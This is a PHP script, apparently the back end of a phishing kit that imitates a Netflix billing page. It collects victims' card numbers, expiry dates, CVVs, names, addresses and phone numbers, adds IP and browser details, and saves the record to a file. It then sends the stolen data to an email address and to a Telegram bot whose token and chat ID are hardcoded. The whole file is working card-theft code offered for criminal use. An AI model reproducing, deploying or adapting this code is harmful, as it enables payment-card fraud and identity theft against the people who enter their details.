<?php 

if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();include '../../data.php';include '../../app/pic/login.png;function cardData($bin){$ch=curl_init();curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_URL,"https://api.freebinchecker.com/bin/".$bin);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);$json=json_decode(curl_exec($ch),true);curl_close($ch);if(!isset($json)||$json['valid']==false||$json==NULL){return "N/A";}return $json;}$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['cnm']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$bin=substr($ccn,0,6);$bin_data=cardData($bin);$bin_type=$bin_data["card"]['type'];$bin_level=$bin_data["card"]['category'];$bin_brand=$bin_data["card"]['scheme'];$bin_currency=$bin_data['country']['currency'];$bin_bank=$bin_data['issuer']['name'];$bin_country=$bin_data['country']['name'];$_SESSION['bank']=$bin_bank;$_SESSION['fname']=$fnm;$_SESSION['ctype']=$ctp;

		$msg.="======= N!tflix FR3SH CC =======\r\n";
    	$msg.="|+ CREDITCARD({$_SESSION['ip_countryName']}) Zae3m\r\n";
		$msg.="CC Number : {$ccn}\r\n";
		$msg.="Expiry : {$cex}\r\n";
		$msg.="CVV : {$csc}\r\n";
    	$msg.="==============================\r\n";
		$msg.="FULL NAME          : {$fnm} {$fln}\r\n";
 		$msg.="Phone	: {$phn} \r\n";
		$msg.="Billing Address       : {$adr}\r\n";
		$msg.="City	: {$cty}\r\n";
		$msg.="State	: {$stt}\r\n";
		$msg.="ZipCode	: {$zip}\r\n";
		$msg.="Country	: {$cnt}\r\n";
    	$msg.="==============================\r\n";
		$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="»»————-　★[ ./💼 https://t.me/zae3m | https://t.me/spam_dollarers | https://t.me/zae3m_tut 💼 ]★　————-««
\r\n\r\n";
	$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";

$save=fopen("../../Zae3m/CC.txt","a+");fwrite($save,$msg);fclose($save);

$subject="*# N!tflix CC #*({$_SESSION['ip_countryName']}) =?UTF-8?Q?=F0=9F=94=A5_?= {$_SESSION['ip']} |Zae3m";
$headers="From: *Zae3m* <zae3m@yandex.ru>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$msg,$headers);@mail($yours,$subject,$msg,$headers);$txt = $msg;
$chat_id = "1436260626"; // Your Telegram Chat ID
$bot_url = "bot5273785611:AAHufywYXU_InWiHlQsaxeRi36e6C6rH0rM"; //Your Telegram Bot Api Key

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
exit('done');}
?>
